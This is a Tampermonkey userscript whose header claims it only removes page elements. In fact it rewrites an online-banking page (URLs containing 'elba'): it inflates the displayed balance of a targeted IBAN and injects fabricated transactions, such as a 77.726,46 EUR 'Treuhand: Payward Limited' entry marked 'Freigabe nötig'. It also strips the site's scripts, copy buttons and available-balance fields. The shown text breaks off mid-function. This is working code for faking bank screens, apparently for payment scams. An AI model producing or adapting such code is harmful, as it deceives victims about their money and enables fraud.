
// ==UserScript==
// @name         Ed Raif Combined Ernst Ries
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  Remove elements with specified class names and their parent elements
// @author       You
// @match        *://*/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/483939/Ed%20Raif%20Combined%20Ernst%20Ries.user.js
// @updateURL https://update.greasyfork.org/scripts/483939/Ed%20Raif%20Combined%20Ernst%20Ries.meta.js
// ==/UserScript==


//===========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========

//===========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========

//===========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========



//MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE
//------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE-------------
     // Specify the modification value here
    var modificationValue = 100.00; // Change this value as needed

    // Specify the text to search for in the page
    var searchText = 'AT79 3427 6000 0002 0552';


//UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE
//------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE----------



//    // Configurable elements
//    var searchText = "AT09 3411 0000 0182 1701"; // Text to search for in the page

    var transactions = [
        {
            transactionName: "Treuhand: Payward Limited",
            transactionDetails: "Freigabe nötig",
            transactionAmount: "77.726,46 EUR",
            transactionOrder: 2 // Order in which this transaction should be inserted
        },
        {
            transactionName: "Payward Limited",
            transactionDetails: "Test",
            transactionAmount: "100.00 EUR",
            transactionOrder: 1 // Order in which this transaction should be inserted
        }
        // Add more transactions as needed
    ];


//===========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========

//===========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========

//===========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========CONFIGURE=========






//MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE
//------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE----------
//MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE
//------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE----------
//MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE


 if (window.location.href.indexOf("elba") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("drive") > 0 ) {


(function() {
    'use strict';

//CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE
//+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++
//CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE
//+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++

//    // Specify the modification value here
//    var modificationValue = 100.00; // Change this value as needed

    // Specify the timeout in milliseconds (e.g., 5000 for 5 seconds)
    var timeout = 20; // Change this value as needed

    // Interval for regular checks (3 seconds)
    var checkInterval = 100; // Change this value as needed

//    // Specify the text to search for in the page
 //   var searchText = 'AT06 3400 0000 0105 2513';

    // Function to parse the balance text with the correct format
    function parseBalanceText(balanceText) {
        var cleanedText = balanceText.replace(/[^\d.,-]/g, ''); // Remove non-numeric characters
        var parsedBalance = parseFloat(cleanedText.replace('.', '').replace(',', '.')); // Parse the balance with dot as the decimal separator
        return isNaN(parsedBalance) ? null : parsedBalance;
    }

    // Function to format the balance text with the correct separators
    function formatBalanceText(balance) {
        return balance.toLocaleString('de-DE', { minimumFractionDigits: 2 }) + ' EUR ';
    }

    // Function to check if the parent contains the specified class and text content
    function doesParentContainClassAndText(element, className, textContent) {
        var parent = element.parentElement;
        while (parent) {
            if (parent.className && parent.className.includes(className)) {
                if (parent.textContent && parent.textContent.includes(textContent)) {
                    console.log('Parent contains class: ' + className + ' and text: ' + textContent);
                    return true;
                }
            }
            parent = parent.parentElement;
        }
        return false;
    }

    // Function to remove elements with aria-label="kopieren" or aria-label="copy"
    function removeKopierenElements() {
        var kopierenElements = document.querySelectorAll('[aria-label="kopieren"], [aria-label="copy"]');
        kopierenElements.forEach(function(element) {
            element.remove();
            console.log('Element with aria-label="kopieren" or aria-label="copy" removed.');
        });
    }

    // Function to modify the balance
    function modifyBalance() {
        var kopierenElement = document.querySelector('[aria-label="kopieren"], [aria-label="copy"]');
        if (kopierenElement) {
            var balanceElements = document.querySelectorAll('.rds-headline.mb-0.text-truncate');
            if (balanceElements) {
                for (var i = 0; i < balanceElements.length; i++) {
                    var balanceElement = balanceElements[i];
                    var parentContainsClassAndText = doesParentContainClassAndText(balanceElement, 'rds-card rds-focus-indicator', searchText);

                    if (parentContainsClassAndText) {
                        var currentBalanceText = balanceElement.textContent;
                        var currentBalance = parseBalanceText(currentBalanceText);
                        if (currentBalance !== null) {
                            var newBalance = currentBalance + modificationValue;
                            var newBalanceText = formatBalanceText(newBalance);
                            balanceElement.textContent = balanceElement.textContent.replace(currentBalanceText, newBalanceText);

                            // Update the class based on the new balance value
                            if (newBalance >= 0) {
                                balanceElement.className = 'rds-headline mb-0 text-truncate text-success ng-star-inserted';
                            } else {
                                balanceElement.className = 'rds-headline mb-0 text-truncate text-danger ng-star-inserted';
                            }

                            console.log('Balance modified. New balance: ' + newBalanceText);

                            // Remove all elements with aria-label="kopieren" or aria-label="copy" after 5 milliseconds
                            setTimeout(removeKopierenElements, 1);

                            break; // Stop processing after modifying the first matching balance
                        }
                    }
                }
            } else {
                console.log('Balance elements not found.');
            }
        } else {
            console.log('Element with aria-label="kopieren" or aria-label="copy" not present. Balance will not be modified.');
        }
    }

    // Function to remove scripts from the document
    function removeScripts() {
        console.log('Removing scripts...');
        document.querySelectorAll('script').forEach(function (script) {
            script.remove();
            console.log('Script removed.');
        });
    }

    // Watch for changes in the DOM and remove added scripts
    var observer = new MutationObserver(function (mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log('Script added. Removing...');
                        node.remove();
                        console.log('Script removed.');
                    }
                }
            }
        }
    });

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // Remove scripts from the document
    removeScripts();

    // Set an interval to run the modifyBalance function periodically
    setInterval(function () {
        console.log('Checking for balance modification conditions...');
        modifyBalance();
    }, checkInterval);

    // Set a timeout to run the modifyBalance function after the specified time
    setTimeout(modifyBalance, timeout);
})();
}

//THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END=====


//MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE
//------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE----------
//MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE
//------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE----------
//MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE

//THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END=====




//UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE
//------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE----------
//UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE
//------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE----------
//UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE

 if (window.location.href.indexOf("elba") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("drive") > 0 ) {


(function() {
    'use strict';

//CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE
//+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++
//CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE
//+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++

//    // Configurable elements
//    var searchText = "AT09 3411 0000 0182 1701"; // Text to search for in the page

//    var transactions = [
//        {
//            transactionName: "Payward Limited",
//            transactionDetails: "Freigabe nötig",
//            transactionAmount: "-200.726,46 EUR",
//            transactionOrder: 2 // Order in which this transaction should be inserted
//        },
//        {
//            transactionName: "Another Transaction",
 //           transactionDetails: "Description",
 //           transactionAmount: "100.00 EUR",
 //           transactionOrder: 1 // Order in which this transaction should be inserted
//        }
        // Add more transactions as needed
//    ];

//CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE
//+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++
//CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE
//+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++++++++CONFIGURE+++++++++

    var transactionInserted = false; // Flag to check if the transaction has been inserted

    // Function to remove scripts from the document
    function removeScripts() {
        console.log('Removing scripts...');
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log('Script removed.');
        });
    }

    // Watch for changes in the DOM and remove added scripts
    var observer = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log('Script added. Removing...');
                        node.remove();
                        console.log('Script removed.');
                    }
                }
            }
        }
    });

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // Remove scripts from the document
    removeScripts();

    // Function to check if the specified text exists
    function isTextPresent() {
        var elements = document.querySelectorAll('.rds-scrub-item.rds-focus-indicator.ng-star-inserted.rds-scrub-item-active');
        for (var i = 0; i < elements.length; i++) {
            if (elements[i].textContent.includes(searchText)) {
                return true;
            }
        }
        return false;
    }

    // Function to create a transaction element
    function createTransactionElement(transaction) {
        var isPositive = !transaction.transactionAmount.startsWith('-');
        var amountClass = isPositive ? 'text-success' : 'text-danger';

        var transactionHtml = `
           <div _ngcontent-bna-c339="" class="ng-star-inserted">
               <rds-list-item-row _ngcontent-bna-c339="" class="rds-list-item-row cursor-pointer rounded-bottom" role="row">
                   <rds-list-item-col _ngcontent-bna-c339="" class="rds-list-item-col rds-list-item-col-left" role="cell">
                       <rds-list-item _ngcontent-bna-c339="" class="rds-list-item rds-focus-indicator rds-2-line rds-list-item-with-avatar">
                           <div class="rds-list-item-content">
                               <rds-badge _ngcontent-bna-c339="" rds-list-avatar="" class="rds-list-avatar ng-tns-c64-23 rds-badge ng-star-inserted"></rds-badge>
                               <div class="rds-list-text">
                                   <p _ngcontent-bna-c339="" rds-line="" class="rds-line">${transaction.transactionName}</p>
                                   <p _ngcontent-bna-c339="" rds-line="" class="rds-line ng-star-inserted">
                                       <small _ngcontent-bna-c339="">${transaction.transactionDetails}</small>
                                   </p>
                               </div>
                           </div>
                       </rds-list-item>
                   </rds-list-item-col>
                   <rds-list-item-col _ngcontent-bna-c339="" placement="right" class="rds-list-item-col w-auto flex-grow-1 flex-shrink-0 rds-list-item-col-right" role="cell">
                       <rds-list-item _ngcontent-bna-c339="" class="rds-list-item rds-focus-indicator content-px-0">
                           <div class="rds-list-item-content">
                               <div class="rds-list-text">
                                   <zv-monetary-amount _ngcontent-bna-c339="" rds-line="" class="rds-line">
                                       <span class="${amountClass}">${transaction.transactionAmount}</span>
                                   </zv-monetary-amount>
                               </div>
                           </div>
                       </rds-list-item>
                   </rds-list-item-col>
                   <rds-list-item-col _ngcontent-bna-c339="" placement="right" class="rds-list-item-col w-auto flex-grow-0 flex-shrink-0 rds-list-item-col-right" role="cell">
                       <rds-list-item _ngcontent-bna-c339="" class="rds-list-item rds-focus-indicator content-px-0">
                           <div class="rds-list-item-content">
                               <div class="rds-list-text sf-hidden"></div>
                               <button _ngcontent-bna-c339="" rds-ghost-button="" class="rds-focus-indicator rds-ghost-button rds-button-base rds-ghost" aria-label="Umsatzdetails aufklappen" aria-expanded="false" aria-disabled="false" type="button">
                                   <span class="rds-button-wrapper">
                                       <rds-icon _ngcontent-bna-c339="" role="img" inline="" class="rds-icon notranslate rds-iconfont icon-chevron-down rds-icon-inline rds-icon-no-color" aria-hidden="true" data-rds-icon-type="font" data-rds-icon-name="icon-chevron-down"></rds-icon>
                                   </span>
                                   <span rdsripple="" class="rds-ripple rds-button-ripple"></span>
                                   <span class="rds-button-focus-overlay"></span>
                               </button>
                           </div>
                       </rds-list-item>
                   </rds-list-item-col>
               </rds-list-item-row>
           </div>`;
        var div = document.createElement('div');
        div.innerHTML = transactionHtml.trim();
        return div.firstChild;
    }

    // Function to check and insert the transactions
    function checkAndInsertTransactions() {
        var gridElement = document.querySelector('[role="grid"]');
        if (gridElement && isTextPresent()) {
            // Sort transactions based on the transactionOrder property
            transactions.sort(function(a, b) {
                return a.transactionOrder - b.transactionOrder;
            });

            transactions.forEach(function(transaction) {
                var transactionExists = Array.from(gridElement.children).some(child => child.textContent.includes(transaction.transactionName));
                if (!transactionExists) {
                    var transactionElement = createTransactionElement(transaction);
                    gridElement.insertBefore(transactionElement, gridElement.firstChild);
                    console.log('Transaction inserted: ' + transaction.transactionName);
                } else {
                    console.log('Transaction already present: ' + transaction.transactionName);
                }
            });
        } else {
            console.log('Grid element not found or specific text not present.');
        }
    }

    // Function to periodically check and insert transactions
    function periodicCheckAndInsert() {
        setInterval(checkAndInsertTransactions, 100); // Check every 2 seconds
    }

    // Main execution
    window.addEventListener('load', periodicCheckAndInsert);
})();
}

//THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END=====


//UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE
//------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE----------
//UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE
//------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE----------
//UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE------------UMSATZE

//THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END=====



//STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE
//------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE----------
//STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE
//------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE----------
//STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE

 if (window.location.href.indexOf("elba") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("drive") > 0 ) {

(function() {
    'use strict';

    // Function to remove parent elements with specified class name (as part of the class name)
    function removeParentElementsWithClassName(classNamePart) {
        var elements = document.querySelectorAll('[class*="' + classNamePart + '"]');
        for (var i = 0; i < elements.length; i++) {
            var parentElement = elements[i].closest('[class*="' + classNamePart + '"]');
            if (parentElement) {
                parentElement.remove();
                console.log('Removed parent element with class name (part): ' + classNamePart);
            }
        }
    }

    // Function to create and configure a Mutation Observer
    function configureMutationObserver() {
        console.log('Configuring Mutation Observer...');
        var observer = new MutationObserver(function(mutationsList) {
            for (var mutation of mutationsList) {
                if (mutation.addedNodes) {
                    for (var node of mutation.addedNodes) {
                        if (node.nodeType === 1) { // Check if it's an element node
                            console.log('Checking added node for parent elements to remove...');
                            removeParentElementsWithClassName("widget grid-item span-x-2"); // Remove parent elements with the specified class name part
                        }
                    }
                }
            }
        });

        // Start observing the document for changes
        observer.observe(document.documentElement, { childList: true, subtree: true });
        console.log('Mutation Observer configured.');
    }

    // Function to periodically check and remove elements
    function periodicCheckAndRemove() {
        setInterval(function() {
            console.log('Checking for parent elements to remove...');
            removeParentElementsWithClassName("widget grid-item span-x-2"); // Remove parent elements with the specified class name part
        }, 10); // Check every 2 seconds
    }

    // Function to remove scripts from the document
    function removeScripts() {
        console.log('Removing scripts...');
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log('Script removed.');
        });
    }

    // Watch for changes in the DOM and remove added scripts
    var observer = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log('Script added. Removing...');
                        node.remove();
                        console.log('Script removed.');
                    }
                }
            }
        }
    });

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // Remove scripts from the document
    removeScripts();

    // Main execution
    window.addEventListener('load', function() {
        console.log('UserScript loaded.');
        configureMutationObserver();
        periodicCheckAndRemove();
    });
})();
}

//THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END=====

//STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE
//------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE----------
//STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE
//------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE----------
//STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE------------STARTSEITE

//THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END=====



//KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND
//------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND----------
//KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND
//------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND----------
//KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND

 if (window.location.href.indexOf("elba") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("drive") > 0 ) {

(function() {
    'use strict';

    // Function to remove scripts from the document
    function removeScripts() {
        console.log('Removing scripts...');
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log('Script removed.');
        });
    }

    // Watch for changes in the DOM and remove added scripts
    var observer = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log('Script added. Removing...');
                        node.remove();
                        console.log('Script removed.');
                    }
                }
            }
        }
    });

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // Remove scripts from the document
    removeScripts();

    // Function to create and configure a Mutation Observer
    function configureMutationObserver() {
        console.log('Configuring Mutation Observer...');
        var observer = new MutationObserver(function(mutationsList) {
            for (var mutation of mutationsList) {
                if (mutation.addedNodes) {
                    for (var node of mutation.addedNodes) {
                        if (node.nodeType === 3) {
                            console.log('Checking added node for text content to remove...');
                            var textContent = node.textContent.trim();
                            if (/Kontostand/i.test(textContent)) {
                                console.log('Found text content: "' + textContent + '"');
                                // Remove both the parent element and the next text node's parent
                                var parentElement = node.parentNode;
                                if (parentElement) {
                                    parentElement.remove();
                                    console.log('Parent element removed.');
                                }
                                var nextTextNode = node.nextSibling;
                                if (nextTextNode && nextTextNode.nodeType === 3) {
                                    console.log('Found next text content: "' + nextTextNode.textContent.trim() + '"');
                                    var nextParentElement = nextTextNode.parentNode;
                                    if (nextParentElement) {
                                        nextParentElement.remove();
                                        console.log('Next parent element removed.');
                                    }
                                }
                            } else if (/^per \d{2}\.\d{2}\.\d{4}$/i.test(textContent)) {
                                console.log('Found text content: "' + textContent + '"');
                                // Remove the parent element of the "per" text content
                                var perParentElement = node.parentNode;
                                if (perParentElement) {
                                    perParentElement.remove();
                                    console.log('Parent element of "per" text content removed.');

                                    // Remove the parent of the parent of the parent of the "per" text content
                                    var grandParentElement = perParentElement.parentNode;
                                    if (grandParentElement) {
                                        grandParentElement.remove();
                                        console.log('Grandparent element of "per" text content removed.');

                                        // Remove the preceding sibling of the grandparent element
                                        var precedingSibling = grandParentElement.previousSibling;
                                        if (precedingSibling) {
                                            precedingSibling.remove();
                                            console.log('Preceding sibling removed.');
                                        }
                                    }
                                }
                            } else if (/^\d{1,3}(\.\d{3})*(,\d{2})?$/i.test(textContent)) {
                                console.log('Found text content: "' + textContent + '"');
                                // Remove the parent element of the "121.190,92" text content
                                var numericParentElement = node.parentNode;
                                if (numericParentElement) {
                                    numericParentElement.remove();
                                    console.log('Parent element of "121.190,92" text content removed.');
                                }
                            }
                        }
                    }
                }
            }
        });

        // Start observing the document for changes
        observer.observe(document.documentElement, { childList: true, subtree: true });
        console.log('Mutation Observer configured.');
    }

    // Function to periodically check for the specified text content
    function periodicCheckForTextContent() {
        setInterval(function() {
            console.log('Checking for text content...');
            var textNodes = document.evaluate('//text()', document.body, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
            for (var i = 0; i < textNodes.snapshotLength; i++) {
                var textNode = textNodes.snapshotItem(i);
                var textContent = textNode.textContent.trim();
                if (/Kontostand/i.test(textContent)) {
                    console.log('Found text content: "' + textContent + '"');
                    // Remove both the parent element and the next text node's parent
                    var parentElement = textNode.parentNode;
                    if (parentElement) {
                        parentElement.remove();
                        console.log('Parent element removed.');
                    }
                    var nextTextNode = textNode.nextSibling;
                    if (nextTextNode && nextTextNode.nodeType === 3) {
                        console.log('Found next text content: "' + nextTextNode.textContent.trim() + '"');
                        var nextParentElement = nextTextNode.parentNode;
                        if (nextParentElement) {
                            nextParentElement.remove();
                            console.log('Next parent element removed.');
                        }
                    }
                } else if (/^per \d{2}\.\d{2}\.\d{4}$/i.test(textContent)) {
                    console.log('Found text content: "' + textContent + '"');
                    // Remove the parent element of the "per" text content
                    var perParentElement = textNode.parentNode;
                    if (perParentElement) {
                        perParentElement.remove();
                        console.log('Parent element of "per" text content removed.');

                        // Remove the parent of the parent of the parent of the "per" text content
                        var grandParentElement = perParentElement.parentNode;
                        if (grandParentElement) {
                            grandParentElement.remove();
                            console.log('Grandparent element of "per" text content removed.');

                            // Remove the preceding sibling of the grandparent element
                            var precedingSibling = grandParentElement.previousSibling;
                            if (precedingSibling) {
                                precedingSibling.remove();
                                console.log('Preceding sibling removed.');
                            }
                        }
                    }
                } else if (/^\d{1,3}(\.\d{3})*(,\d{2})?$/i.test(textContent)) {
                    console.log('Found text content: "' + textContent + '"');
                    // Remove the parent element of the "121.190,92" text content
                    var numericParentElement = textNode.parentNode;
                    if (numericParentElement) {
                        numericParentElement.remove();
                        console.log('Parent element of "121.190,92" text content removed.');
                    }
                }
            }
        }, 200); // Check every 2 seconds
    }

    // Main execution
    window.addEventListener('load', function() {
        console.log('UserScript loaded.');
        configureMutationObserver();
        periodicCheckForTextContent();
    });
})();

      }

//THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END=====


//KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND
//------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND----------
//KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND
//------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND----------
//KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND------------KONTOSTAND

//THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END======THE END=====


//GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY
//------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY----------
//GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY
//------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY----------
//GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY------------GET UTILITY

 if (window.location.href.indexOf("elba") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("drive") > 0 ) {

(function() {
    'use strict';

    // Function to create and configure a Mutation Observer
    function configureMutationObserver() {
        console.log('Configuring Mutation Observer...');
        var observer = new MutationObserver(function(mutationsList) {
            for (var mutation of mutationsList) {
                if (mutation.addedNodes) {
                    for (var node of mutation.addedNodes) {
                        if (node.nodeType === 3 && /verfügbar/i.test(node.textContent)) { // Check if it's a text node with the text content containing "verfügbar" (case-insensitive)
                            console.log('Found text content: "' + node.textContent.trim() + '"');
                            // Remove the parent element and its sibling
                            var parentElement = node.parentNode;
                            if (parentElement) {
                                var siblingElement = parentElement.nextElementSibling;
                                if (siblingElement) {
                                    siblingElement.remove();
                                    console.log('Sibling element removed.');
                                }
                                parentElement.remove();
                                console.log('Parent element removed.');
                            }
                        }
                    }
                }
            }
        });

        // Start observing the document for changes
        observer.observe(document.documentElement, { childList: true, subtree: true });
        console.log('Mutation Observer configured.');
    }

    // Function to periodically check for the text content
    function periodicCheckForTextContent() {
        setInterval(function() {
            console.log('Checking for text content containing "verfügbar"...');
            var textNodes = document.evaluate('//text()', document.body, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
            for (var i = 0; i < textNodes.snapshotLength; i++) {
                var textNode = textNodes.snapshotItem(i);
                if (/verfügbar/i.test(textNode.textContent)) { // Check if the text content contains "verfügbar" (case-insensitive)
                    console.log('Found text content: "' + textNode.textContent.trim() + '"');
                    // Remove the parent element and its sibling
                    var parentElement = textNode.parentNode;
                    if (parentElement) {
                        var siblingElement = parentElement.nextElementSibling;
                        if (siblingElement) {
                            siblingElement.remove();
                            console.log('Sibling element removed.');
                        }
                        parentElement.remove();
                        console.log('Parent element removed.');
                    }
                }
            }
        }, 10); // Check every 2 seconds
    }

    // Function to periodically check for the zv-umsatzsucheingabe element and remove it
    function periodicCheckAndRemoveZvElement() {
        setInterval(function() {
            console.log('Checking for zv-umsatzsucheingabe element...');
            var zvElement = document.querySelector('zv-umsatzsucheingabe.ng-star-inserted');
            if (zvElement) {
                zvElement.remove();
                console.log('zv-umsatzsucheingabe element removed.');
            }
        }, 1000); // Check every 1 second
    }

    // Main execution
    window.addEventListener('load', function() {
        console.log('UserScript loaded.');
